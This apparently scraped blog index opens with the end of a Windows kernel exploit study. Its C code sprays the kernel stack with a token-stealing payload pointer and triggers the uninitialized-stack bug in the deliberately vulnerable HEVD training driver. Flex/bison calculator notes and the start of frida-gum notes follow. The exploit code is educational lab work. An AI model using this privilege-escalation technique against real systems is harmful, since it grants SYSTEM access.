DEBUG_ERROR(&quot;\\t\\t\\t[-] Memory Allocation Failed For SYSTEM_MODULE_INFORMATION: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } NtStatus = NtQuerySystemInformation(SystemModuleInformation, pSystemModuleInformation, ReturnLength, &amp;ReturnLength); if (NtStatus != STATUS_SUCCESS) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed To Get SYSTEM_MODULE_INFORMATION: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } KernelBaseAddressInKernelMode = pSystemModuleInformation-&gt;Module[0].Base; KernelImage = strrchr((PCHAR)(pSystemModuleInformation-&gt;Module[0].ImageName), '\\\\') + 1; hKernelInUserMode = LoadLibraryA(KernelImage); if (!hKernelInUserMode) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed To Load Kernel: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } ZwOpenProcess = (ZwOpenProcess_t)GetProcAddress(hKernelInUserMode, &quot;ZwOpenProcess&quot;); if (!ZwOpenProcess) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving ZwOpenProcess: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { ZwOpenProcess = (ZwOpenProcess_t)((ULONG)ZwOpenProcess - (ULONG)hKernelInUserMode); ZwOpenProcess = (ZwOpenProcess_t)((ULONG)ZwOpenProcess + (ULONG)KernelBaseAddressInKernelMode); DEBUG_INFO(&quot;\\t\\t\\t[+] ZwOpenProcess: 0x%p\\n&quot;, ZwOpenProcess); } ZwOpenProcessToken = (ZwOpenProcessToken_t)GetProcAddress(hKernelInUserMode, &quot;ZwOpenProcessToken&quot;); if (!ZwOpenProcessToken) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving ZwOpenProcessToken: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { ZwOpenProcessToken = (ZwOpenProcessToken_t)((ULONG)ZwOpenProcessToken - (ULONG)hKernelInUserMode); ZwOpenProcessToken = (ZwOpenProcessToken_t)((ULONG)ZwOpenProcessToken + (ULONG)KernelBaseAddressInKernelMode); DEBUG_INFO(&quot;\\t\\t\\t[+] ZwOpenProcessToken: 0x%p\\n&quot;, ZwOpenProcess); } ZwDuplicateToken = (ZwDuplicateToken_t)GetProcAddress(hKernelInUserMode, &quot;ZwDuplicateToken&quot;); if (!ZwDuplicateToken) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving ZwDuplicateToken: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { ZwDuplicateToken = (ZwDuplicateToken_t)((ULONG)ZwDuplicateToken - (ULONG)hKernelInUserMode); ZwDuplicateToken = (ZwDuplicateToken_t)((ULONG)ZwDuplicateToken + (ULONG)KernelBaseAddressInKernelMode); DEBUG_INFO(&quot;\\t\\t\\t[+] ZwDuplicateToken: 0x%p\\n&quot;, ZwDuplicateToken); } PsGetCurrentProcess = (PsGetCurrentProcess_t)GetProcAddress(hKernelInUserMode, &quot;PsGetCurrentProcess&quot;); if (!PsGetCurrentProcess) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving PsGetCurrentProcess: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { PsGetCurrentProcess = (PsGetCurrentProcess_t)((ULONG)PsGetCurrentProcess - (ULONG)hKernelInUserMode); PsGetCurrentProcess = (PsGetCurrentProcess_t)((ULONG)PsGetCurrentProcess + (ULONG)KernelBaseAddressInKernelMode); DEBUG_INFO(&quot;\\t\\t\\t[+] PsGetCurrentProcess: 0x%p\\n&quot;, PsGetCurrentProcess); } ZwSetInformationProcess = (ZwSetInformationProcess_t)GetProcAddress(hKernelInUserMode, &quot;ZwSetInformationProcess&quot;); if (!ZwSetInformationProcess) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving ZwSetInformationProcess: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { ZwSetInformationProcess = (ZwSetInformationProcess_t)((ULONG)ZwSetInformationProcess - (ULONG)hKernelInUserMode); ZwSetInformationProcess = (ZwSetInformationProcess_t)((ULONG)ZwSetInformationProcess + (ULONG)KernelBaseAddressInKernelMode); DEBUG_INFO(&quot;\\t\\t\\t[+] ZwSetInformationProcess: 0x%p\\n&quot;, ZwSetInformationProcess); } ZwClose = (ZwClose_t)GetProcAddress(hKernelInUserMode, &quot;ZwClose&quot;); if (!ZwClose) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving ZwClose: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { ZwClose = (ZwClose_t)((ULONG)ZwClose - (ULONG)hKernelInUserMode); ZwClose = (ZwClose_t)((ULONG)ZwClose + (ULONG)KernelBaseAddressInKernelMode); DEBUG_INFO(&quot;\\t\\t\\t[+] ZwClose: 0x%p\\n&quot;, ZwClose); } HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation); if (hNtDll) { FreeLibrary(hNtDll); } if (hKernelInUserMode) { FreeLibrary(hKernelInUserMode); } hNtDll = NULL; hKernelInUserMode = NULL; pSystemModuleInformation = NULL;}DWORD WINAPI UninitializedStackVariableThread(LPVOID Parameter) { UINT32 i = 0; ULONG BytesReturned; HANDLE hFile = NULL; ULONG MagicValue = 0xBAADF00D; PULONG StackSprayBuffer = NULL; LPCSTR FileName = (LPCSTR)DEVICE_NAME; NTSTATUS NtStatus = STATUS_UNSUCCESSFUL; PVOID EopPayload = &amp;TokenStealingPayloadDuplicateToken; SIZE_T StackSprayBufferSize = 1024 * sizeof(ULONG_PTR); __try { DEBUG_MESSAGE(&quot;\\t[+] Setting Thread Priority\\n&quot;); if (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST)) { DEBUG_ERROR(&quot;\\t\\t[-] Failed To Set As THREAD_PRIORITY_HIGHEST\\n&quot;); } else { DEBUG_INFO(&quot;\\t\\t[+] Priority Set To THREAD_PRIORITY_HIGHEST\\n&quot;); } // Get the device handle DEBUG_MESSAGE(&quot;\\t[+] Getting Device Driver Handle\\n&quot;); DEBUG_INFO(&quot;\\t\\t[+] Device Name: %s\\n&quot;, FileName); hFile = GetDeviceHandle(FileName); if (hFile == INVALID_HANDLE_VALUE) { DEBUG_ERROR(&quot;\\t\\t[-] Failed Getting Device Handle: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { DEBUG_INFO(&quot;\\t\\t[+] Device Handle: 0x%X\\n&quot;, hFile); } DEBUG_MESSAGE(&quot;\\t[+] Setting Up Vulnerability Stage\\n&quot;); DEBUG_INFO(&quot;\\t\\t[+] Allocating Memory For Buffer\\n&quot;); StackSprayBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, StackSprayBufferSize); if (!StackSprayBuffer) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed To Allocate Memory: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { DEBUG_INFO(&quot;\\t\\t\\t[+] Memory Allocated: 0x%p\\n&quot;, StackSprayBuffer); DEBUG_INFO(&quot;\\t\\t\\t[+] Allocation Size: 0x%X\\n&quot;, StackSprayBufferSize); } DEBUG_INFO(&quot;\\t\\t[+] Preparing Buffer Memory Layout\\n&quot;); //填充buffer for(i = 0; i &lt; StackSprayBufferSize / sizeof(ULONG_PTR); i++) { StackSprayBuffer[i] = (ULONG)EopPayload; } DEBUG_INFO(&quot;\\t\\t[+] EoP Payload: 0x%p\\n&quot;, EopPayload); //找到NtMapUserPhysicalPages API的地址，后面要调用 ResolveKernelAPIs(); DEBUG_INFO(&quot;\\t\\t[+] Spraying the Kernel Stack\\n&quot;); DEBUG_MESSAGE(&quot;\\t[+] Triggering Use of Uninitialized Stack Variable\\n&quot;); OutputDebugString(&quot;****************Kernel Mode****************\\n&quot;); // HackSys Extreme Vulnerable driver itself provides a decent interface // to spray the stack using Stack Overflow vulnerability. However, j00ru // on his blog disclosed a Windows API that can be used to spray stack up to // 1024*sizeof(ULONG_PTR) bytes (http://j00ru.vexillium.org/?p=769). Since, // it's a Windows API and available on Windows by default, I decided to use // it instead of this driver's Stack Overflow interface. //喷射kernel stack NtMapUserPhysicalPages(NULL, 1024, StackSprayBuffer); // Kernel Stack should not be used for anything else as it // will corrupt the current sprayed state. So, we will directly // trigger the vulnerability without putting any Debug prints. //触发漏洞 DeviceIoControl(hFile, HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE, (LPVOID)&amp;MagicValue, 0, NULL, 0, &amp;BytesReturned, NULL); OutputDebugString(&quot;****************Kernel Mode****************\\n&quot;); HeapFree(GetProcessHeap(), 0, (LPVOID)StackSprayBuffer); StackSprayBuffer = NULL; } __except (EXCEPTION_EXECUTE_HANDLER) { DEBUG_ERROR(&quot;\\t\\t[-] Exception: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } return EXIT_SUCCESS;} 0x05: 参考HEVD Kernel Exploitation – Uninitialized Stack &amp; Heap By k0shlnt!NtMapUserPhysicalPages and Kernel Stack-Spraying Techniques","link":"/2017/02/04/Windows-Kernel-Exploit-Study-3/"},{"title":"flex_bison读书笔记","text":"0x00: 起因工作上的一些原因需要学习一下。做个记录督促自己读书学习，好好学习。 0x01: 一些概念语句和表达式 表达式（Expression）有值，而语句（Statement）不总有。1234567表达式是可以被求值的代码，而语句是一段可执行代码。因为表达式可被求值，所以它可写在赋值语句等号的右侧。而语句不一定有值，所以像import、for和break等语句就不能被用于赋值。Python的语句分为两大类：简单和复合语句。简单语句是指一逻辑行的代码。例如表达式语句、赋值语句和return语句等。复合语句是指包含、影响或控制一组语句的代码。例如if、try和class语句等。表达式本身可以作为表达式语句，也能作为赋值语句的右值或if语句的条件等，所以表达式可以作为语句的组成部分，但不是必须成分（例如continue语句）。 左递归一个文法是左递归的，若我们可以找出其中存在某非终端符号A，最终会推导出来的句型(sentential form)里面包含以自己为最左符号(left-symbol)的句型 直接左递归 1Expr ----&gt; Expr + Term 举个例子： 1A ---&gt; Aa|C 间接左递归 12A ---&gt; Ba|CB ---&gt; Ab|D 这种会产生： 1A ---&gt; Ba ---&gt; Aba ---&gt; ... 0x02: 高级计算器的实现先看语法分析的部分：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109$ cat fb3-2.y/* Companion source code for &quot;flex &amp; bison&quot;, published by O'Reilly * Media, ISBN 978-0-596-15597-1 * Copyright (c) 2009, Taughannock Networks. All rights reserved. * See the README file for license conditions and contact info. * $Header: /home/johnl/flnb/code/RCS/fb3-2.y,v 2.1 2009/11/08 02:53:18 johnl Exp $ *//* calculator with AST */%{# include &lt;stdio.h&gt;# include &lt;stdlib.h&gt;# include &quot;fb3-2.h&quot;%}%union { struct ast *a; double d; struct symbol *s; /* which symbol */ struct symlist *sl; int fn; /* which function */}/* declare tokens */ 表明类型%token &lt;d&gt; NUMBER%token &lt;s&gt; NAME%token &lt;fn&gt; FUNC%token EOL%token IF THEN ELSE WHILE DO LET//right、left表明了结合顺序，即优先级%nonassoc &lt;fn&gt; CMP%right '='%left '+' '-'%left '*' '/'%nonassoc '|' UMINUS//把值&lt;a&gt;赋值给了 stmt list explist 三者%type &lt;a&gt; exp stmt list explist//同理%type &lt;sl&gt; symlist%start calclist%%//语句，调用相对应的方法，生成ASTstmt: IF exp THEN list { $$ = newflow('I', $2, $4, NULL); } | IF exp THEN list ELSE list { $$ = newflow('I', $2, $4, $6); } | WHILE exp DO list { $$ = newflow('W', $2, $4, NULL); } | exp;//右递归list: /* nothing */ { $$ = NULL; } | stmt ';' list { if ($3 == NULL) $$ = $1; else $$ = newast('L', $1, $3); } ;//表达式的ast构建exp: exp CMP exp { $$ = newcmp($2, $1, $3); } | exp '+' exp { $$ = newast('+', $1,$3); } | exp '-' exp { $$ = newast('-', $1,$3);} | exp '*' exp { $$ = newast('*', $1,$3); } | exp '/' exp { $$ = newast('/', $1,$3); } | '|' exp { $$ = newast('|', $2, NULL); } | '(' exp ')' { $$ = $2; } | '-' exp %prec UMINUS { $$ = newast('M', $2, NULL); } | NUMBER { $$ = newnum($1); } | FUNC '(' explist ')' { $$ = newfunc($1, $3); } | NAME { $$ = newref($1); } | NAME '=' exp { $$ = newasgn($1, $3); } | NAME '(' explist ')' { $$ = newcall($1, $3); };//表达式列表explist: exp | exp ',' explist { $$ = newast('L', $1, $3); };//符号列表，用于函数调用，右递归的symlist: NAME { $$ = newsymlist($1, NULL); } | NAME ',' symlist { $$ = newsymlist($1, $3); };//计算器的顶层规则calclist: /* nothing */ | calclist stmt EOL { if(debug) dumpast($2, 0); printf(&quot;= %4.4g\\n&gt; &quot;, eval($2)); treefree($2); } //识别一个函数声明 let xxx() = xxx 这样的 | calclist LET NAME '(' symlist ')' '=' list EOL { dodef($3, $5, $8); printf(&quot;Defined %s\\n&gt; &quot;, $3-&gt;name); } | calclist error EOL { yyerrok; printf(&quot;&gt; &quot;); } ;%% 词法分析部分：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879$ cat fb3-2.l/* Companion source code for &quot;flex &amp; bison&quot;, published by O'Reilly * Media, ISBN 978-0-596-15597-1 * Copyright (c) 2009, Taughannock Networks. All rights reserved. * See the README file for license conditions and contact info. * $Header: /home/johnl/flnb/code/RCS/fb3-2.l,v 2.1 2009/11/08 02:53:18 johnl Exp $ *//* recognize tokens for the calculator */%option noyywrap nodefault yylineno%{# include &quot;fb3-2.h&quot;# include &quot;fb3-2.tab.h&quot;%}/* float exponent */ 浮点数，e开头，正负，这是指数部分EXP ([Ee][-+]?[0-9]+)//操作符单操作数%% /* single character ops */&quot;+&quot; |&quot;-&quot; |&quot;*&quot; |&quot;/&quot; |&quot;=&quot; |&quot;|&quot; |&quot;,&quot; |&quot;;&quot; |&quot;(&quot; |&quot;)&quot; { return yytext[0]; }//双操作数操作符 /* comparison ops */&quot;&gt;&quot; { yylval.fn = 1; return CMP; }&quot;&lt;&quot; { yylval.fn = 2; return CMP; }&quot;&lt;&gt;&quot; { yylval.fn = 3; return CMP; }&quot;==&quot; { yylval.fn = 4; return CMP; }&quot;&gt;=&quot; { yylval.fn = 5; return CMP; }&quot;&lt;=&quot; { yylval.fn = 6; return CMP; }//关键字 /* keywords */&quot;if&quot; { return IF; }&quot;then&quot; { return THEN; }&quot;else&quot; { return ELSE; }&quot;while&quot; { return WHILE; }&quot;do&quot; { return DO; }&quot;let&quot; { return LET;}//内建的一些函数 /* built in functions */&quot;sqrt&quot; { yylval.fn = B_sqrt; return FUNC; }&quot;exp&quot; { yylval.fn = B_exp; return FUNC; }&quot;log&quot; { yylval.fn = B_log; return FUNC; }&quot;print&quot; { yylval.fn = B_print; return FUNC; } /* debug hack */&quot;debug&quot;[0-9]+ { debug = atoi(&amp;yytext[5]); printf(&quot;debug set to %d\\n&quot;, debug); }//声明的函数的函数名，字母开头 /* names */[a-zA-Z][a-zA-Z0-9]* { yylval.s = lookup(yytext); return NAME; }//浮点数[0-9]+&quot;.&quot;[0-9]*{EXP}? |&quot;.&quot;?[0-9]+{EXP}? { yylval.d = atof(yytext); return NUMBER; }//其他的符号&quot;//&quot;.*[ \\t] /* ignore white space */\\\\\\n printf(&quot;c&gt; &quot;); /* ignore line continuation */&quot;\\n&quot; { return EOL; }. { yyerror(&quot;Mystery character %c\\n&quot;, *yytext); }%% 函数实现，构造ast什么的：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546$ cat fb3-2funcs.c/* Companion source code for &quot;flex &amp; bison&quot;, published by O'Reilly * Media, ISBN 978-0-596-15597-1 * Copyright (c) 2009, Taughannock Networks. All rights reserved. * See the README file for license conditions and contact info. * $Header: /home/johnl/flnb/code/RCS/fb3-2funcs.c,v 2.1 2009/11/08 02:53:18 johnl Exp $ *//* * helper functions for fb3-2 */# include &lt;stdio.h&gt;# include &lt;stdlib.h&gt;# include &lt;stdarg.h&gt;# include &lt;string.h&gt;# include &lt;math.h&gt;# include &quot;fb3-2.h&quot;//这些是辅助函数：构造符号表、hash算法、查找/* symbol table *//* hash a symbol */static unsignedsymhash(char *sym){ unsigned int hash = 0; unsigned c; while(c = *sym++) hash = hash*9 ^ c; return hash;}struct symbol *lookup(char* sym){ struct symbol *sp = &amp;symtab[symhash(sym)%NHASH]; int scount = NHASH; /* how many have we looked at */ while(--scount &gt;= 0) { if(sp-&gt;name &amp;&amp; !strcmp(sp-&gt;name, sym)) { return sp; } if(!sp-&gt;name) { /* new entry */ sp-&gt;name = strdup(sym); sp-&gt;value = 0; sp-&gt;func = NULL; sp-&gt;syms = NULL; return sp; } if(++sp &gt;= symtab+NHASH) sp = symtab; /* try the next entry */ } yyerror(&quot;symbol table overflow\\n&quot;); abort(); /* tried them all, table is full */}//这是构造ast的函数，根据参数，填充ast的结构。//填充 type，节点什么的struct ast *newast(int nodetype, struct ast *l, struct ast *r){ struct ast *a = malloc(sizeof(struct ast)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = nodetype; a-&gt;l = l; a-&gt;r = r; return a;}//number的aststruct ast *newnum(double d){ struct numval *a = malloc(sizeof(struct numval)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = 'K'; a-&gt;number = d; return (struct ast *)a;}//比较表达式的aststruct ast *newcmp(int cmptype, struct ast *l, struct ast *r){ struct ast *a = malloc(sizeof(struct ast)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = '0' + cmptype; a-&gt;l = l; a-&gt;r = r; return a;}//函数的aststruct ast *newfunc(int functype, struct ast *l){ struct fncall *a = malloc(sizeof(struct fncall)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = 'F'; a-&gt;l = l; a-&gt;functype = functype; return (struct ast *)a;}//调用的ast// call funcname();这种struct ast *newcall(struct symbol *s, struct ast *l){ struct ufncall *a = malloc(sizeof(struct ufncall)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = 'C'; a-&gt;l = l; a-&gt;s = s; return (struct ast *)a;}//引用的aststruct ast *newref(struct symbol *s){ struct symref *a = malloc(sizeof(struct symref)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = 'N'; a-&gt;s = s; return (struct ast *)a;}//赋值表达式 aststruct ast *newasgn(struct symbol *s, struct ast *v){ struct symasgn *a = malloc(sizeof(struct symasgn)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = '='; a-&gt;s = s; a-&gt;v = v; return (struct ast *)a;}//条件表达式的aststruct ast *newflow(int nodetype, struct ast *cond, struct ast *tl, struct ast *el){ struct flow *a = malloc(sizeof(struct flow)); if(!a) { yyerror(&quot;out of space&quot;); exit(0); } a-&gt;nodetype = nodetype; a-&gt;cond = cond; a-&gt;tl = tl; a-&gt;el = el; return (struct ast *)a;}//符号liststruct symlist *newsymlist(struct symbol *sym, struct symlist *next){ struct symlist *sl = malloc(sizeof(struct symlist)); if(!sl) { yyerror(&quot;out of space&quot;); exit(0); } sl-&gt;sym = sym; sl-&gt;next = next; return sl;}//释放符号listvoidsymlistfree(struct symlist *sl){ struct symlist *nsl; while(sl) { nsl = sl-&gt;next; free(sl); sl = nsl; }}//定义一个函数//func(parma1,parma2…);/* define a function */voiddodef(struct symbol *name, struct symlist *syms, struct ast *func){ if(name-&gt;syms) symlistfree(name-&gt;syms); if(name-&gt;func) treefree(name-&gt;func); name-&gt;syms = syms; name-&gt;func = func;}static double callbuiltin(struct fncall *);static double calluser(struct ufncall *);//ast求值doubleeval(struct ast *a){ double v; if(!a) { yyerror(&quot;internal error, null eval&quot;); return 0.0; } switch(a-&gt;nodetype) { /* constant */ case 'K': v = ((struct numval *)a)-&gt;number; break; /* name reference */ case 'N': v = ((struct symref *)a)-&gt;s-&gt;value; break; /* assignment */ case '=': v = ((struct symasgn *)a)-&gt;s-&gt;value = eval(((struct symasgn *)a)-&gt;v); break; /* expressions */ case '+': v = eval(a-&gt;l) + eval(a-&gt;r); break; case '-': v = eval(a-&gt;l) - eval(a-&gt;r); break; case '*': v = eval(a-&gt;l) * eval(a-&gt;r); break; case '/': v = eval(a-&gt;l) / eval(a-&gt;r); break; case '|': v = fabs(eval(a-&gt;l)); break; case 'M': v = -eval(a-&gt;l); break; /* comparisons */ case '1': v = (eval(a-&gt;l) &gt; eval(a-&gt;r))? 1 : 0; break; case '2': v = (eval(a-&gt;l) &lt; eval(a-&gt;r))? 1 : 0; break; case '3': v = (eval(a-&gt;l) != eval(a-&gt;r))? 1 : 0; break; case '4': v = (eval(a-&gt;l) == eval(a-&gt;r))? 1 : 0; break; case '5': v = (eval(a-&gt;l) &gt;= eval(a-&gt;r))? 1 : 0; break; case '6': v = (eval(a-&gt;l) &lt;= eval(a-&gt;r))? 1 : 0; break; //这部分是对条件表达式的ast的求值 //比如if else 这些 /* control flow */ /* null if/else/do expressions allowed in the grammar, so check for them */ case 'I’: //条件成立，走then或者do的分支 if( eval( ((struct flow *)a)-&gt;cond) != 0) { if( ((struct flow *)a)-&gt;tl) { v = eval( ((struct flow *)a)-&gt;tl); } else v = 0.0; /* a default value */ //不成立，走else分支 } else { if( ((struct flow *)a)-&gt;el) { v = eval(((struct flow *)a)-&gt;el); } else v = 0.0; /* a default value */ } break; // while语句 case 'W': v = 0.0; /* a default value */ //条件成立，走do的逻辑 if( ((struct flow *)a)-&gt;tl) { while( eval(((struct flow *)a)-&gt;cond) != 0) v = eval(((struct flow *)a)-&gt;tl); } //不成立，凉凉，啥都不做 break; /* last value is value */ //语句列表 // case 'L': eval(a-&gt;l); v = eval(a-&gt;r); break; //函数 //func(param…); case 'F': v = callbuiltin((struct fncall *)a); break; //用户调用部分 //比如 call xxx(); case 'C': v = calluser((struct ufncall *)a); break; default: printf(&quot;internal error: bad node %c\\n&quot;, a-&gt;nodetype); } return v;}//一些内建函数的实现，cc支持的static doublecallbuiltin(struct fncall *f){ enum bifs functype = f-&gt;functype; double v = eval(f-&gt;l); switch(functype) { case B_sqrt: return sqrt(v); case B_exp: return exp(v); case B_log: return log(v); case B_print: printf(&quot;= %4.4g\\n&quot;, v); return v; default: yyerror(&quot;Unknown built-in function %d&quot;, functype); return 0.0; }}//函数调用的实现，比较重要的部分。static doublecalluser(struct ufncall *f){ //获取函数的信息，函数名，参数等 struct symbol *fn = f-&gt;s; /* function name */ //形参 struct symlist *sl; /* dummy arguments */ //实参 struct ast *args = f-&gt;l; /* actual arguments */ //保存的参数 double *oldval, *newval; /* saved arg values */ double v; int nargs; int i; if(!fn-&gt;func) { yyerror(&quot;call to undefined function&quot;, fn-&gt;name); return 0; } //获取参数数量，从形参列表遍历获得 /* count the arguments */ sl = fn-&gt;syms; for(nargs = 0; sl; sl = sl-&gt;next) nargs++; //为保存参数分配空间 /* prepare to save them */ oldval = (double *)malloc(nargs * sizeof(double)); newval = (double *)malloc(nargs * sizeof(double)); if(!oldval || !newval) { yyerror(&quot;Out of space in %s&quot;, fn-&gt;name); return 0.0; } //参数可能是表达式，所以需要对其求值。 //比如 max(1+2,5) 就需要对第一个参数先求值，然后再进行计算。 /* evaluate the arguments */ for(i = 0; i &lt; nargs; i++) { if(!args) { yyerror(&quot;too few args in call to %s&quot;, fn-&gt;name); free(oldval); free(newval); return 0; } if(args-&gt;nodetype == 'L') { /* if this is a list node */ newval[i] = eval(args-&gt;l); args = args-&gt;r; } else { /* if it's the end of the list */ newval[i] = eval(args); args = NULL; } } //保存形参的旧值，然后更新新值 //比如 max(1+2,4-1) 更新成 max(3，3) /* save old values of dummies, assign new ones */ sl = fn-&gt;syms; for(i = 0; i &lt; nargs; i++) { struct symbol *s = sl-&gt;sym; oldval[i] = s-&gt;value; s-&gt;value = newval[i]; sl = sl-&gt;next; } free(newval); /* evaluate the function */ //参数都更新完了之后，就可以直接去计算函数值了 v = eval(fn-&gt;func); /* put the dummies back */ //因为之前更改了形参的list，现在要恢复 sl = fn-&gt;syms; for(i = 0; i &lt; nargs; i++) { struct symbol *s = sl-&gt;sym; s-&gt;value = oldval[i]; sl = sl-&gt;next; } free(oldval); return v;}//释放节点，分情况，因为不同的操作符，子树数目不同，所以要分情况。voidtreefree(struct ast *a){ switch(a-&gt;nodetype) { /* two subtrees */ case '+': case '-': case '*': case '/': case '1': case '2': case '3': case '4': case '5': case '6': case 'L': treefree(a-&gt;r); /* one subtree */ case '|': case 'M': case 'C': case 'F': treefree(a-&gt;l); /* no subtree */ case 'K': case 'N': break; case '=': free( ((struct symasgn *)a)-&gt;v); break; case 'I': case 'W': free( ((struct flow *)a)-&gt;cond); if( ((struct flow *)a)-&gt;tl) free( ((struct flow *)a)-&gt;tl); if( ((struct flow *)a)-&gt;el) free( ((struct flow *)a)-&gt;el); break; default: printf(&quot;internal error: free bad node %c\\n&quot;, a-&gt;nodetype); } free(a); /* always free the node itself */}voidyyerror(char *s, ...){ va_list ap; va_start(ap, s); fprintf(stderr, &quot;%d: error: &quot;, yylineno); vfprintf(stderr, s, ap); fprintf(stderr, &quot;\\n&quot;);}intmain(){ printf(&quot;&gt; &quot;); return yyparse();}//把ast dump出来做显示，方便调试/* debugging: dump out an AST */int debug = 0;voiddumpast(struct ast *a, int level){ printf(&quot;%*s&quot;, 2*level, &quot;&quot;); /* indent to this level */ level++; if(!a) { printf(&quot;NULL\\n&quot;); return; } switch(a-&gt;nodetype) { /* constant */ case 'K': printf(&quot;number %4.4g\\n&quot;, ((struct numval *)a)-&gt;number); break; /* name reference */ case 'N': printf(&quot;ref %s\\n&quot;, ((struct symref *)a)-&gt;s-&gt;name); break; /* assignment */ case '=': printf(&quot;= %s\\n&quot;, ((struct symref *)a)-&gt;s-&gt;name); dumpast( ((struct symasgn *)a)-&gt;v, level); return; /* expressions */ case '+': case '-': case '*': case '/': case 'L': case '1': case '2': case '3': case '4': case '5': case '6': printf(&quot;binop %c\\n&quot;, a-&gt;nodetype); dumpast(a-&gt;l, level); dumpast(a-&gt;r, level); return; case '|': case 'M': printf(&quot;unop %c\\n&quot;, a-&gt;nodetype); dumpast(a-&gt;l, level); return; case 'I': case 'W': printf(&quot;flow %c\\n&quot;, a-&gt;nodetype); dumpast( ((struct flow *)a)-&gt;cond, level); if( ((struct flow *)a)-&gt;tl) dumpast( ((struct flow *)a)-&gt;tl, level); if( ((struct flow *)a)-&gt;el) dumpast( ((struct flow *)a)-&gt;el, level); return; case 'F': printf(&quot;builtin %d\\n&quot;, ((struct fncall *)a)-&gt;functype); dumpast(a-&gt;l, level); return; case 'C': printf(&quot;call %s\\n&quot;, ((struct ufncall *)a)-&gt;s-&gt;name); dumpast(a-&gt;l, level); return; default: printf(&quot;bad %c\\n&quot;, a-&gt;nodetype); return; }} 0x03: 使用测试环境 ubuntu 16.04 x64这部分没啥意思，随便测试下就好了，主要还是看上面的代码。 123# muhe @ ubuntu in ~/flexbison [20:49:52] $ ./fb3-2 &gt; 1+123 = 124 &gt; 1 = 1 &gt; 2 = 2 &gt; 1.1+2 = 3.1 &gt; 3.33333/1.2344 = 2.7&gt; let max(x,y) = if x &gt;= y then x;else y;; Defined max &gt; max(0.1,-0.2) = 0.1 &gt; max(99999999999999999999999999999999999999999,999999999999999999999999999999999999999999999999999999999999999999999999999) = 1e+75 &gt; 设置了debug之后可以看到ast，方便调试： 123&gt; let max(x,y) = if x &gt;= y then x;else y;; Defined max &gt; max(1,2) call max binop L number 1 number 2 = 2 &gt; &gt; 0x04: sql分析书中第四章是一个sql的分析器，含词法分析、语法分析，代码量还好不算特别大。 目录结构: 123456789$ tree ..├── Makefile├── glrmysql.l #mysql子集词法分析器├── glrmysql.y #mysql子集语法分析器├── lpmysql.l├── lpmysql.y├── pmysql.l└── pmysql.y *.l是词法分析部分，*.y是语法分析部分。 这里有三份代码，glrxxxxx是第四章的代码，lpmxxxx是第八章的代码，pmysqlxx是第九章的代码，这里只看第四章的代码，这个例子比较简单，简化了很多东西。 0x05: 引用在编程概念中，表达式和语句分别是什么概念？左递归","link":"/2018/01/06/flex-bison%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"title":"frida-gum代码阅读笔记","text":"0x00 : 前言与预备知识frida : frida是一个优秀的跨平台Dynamic instrumentation toolkit，具体可以看官网介绍 GObject对象系统 GObject这个比较重要，因为frida框架底层的hook框架Frida-gum是纯c写的，为了实现一些面向对象的编程，使用了Gobject。 注：本篇主要是看interceptor这种hook方式，针对函数头，之后会有一篇针对Stalker 模式的分析。 0x01 : 项目构架直接拉下来的代码如下 1234567891011121314151617181920212223242526272829303132╭─muhe@muheMacBookPro ~/Code/frida ‹master*›╰─$ 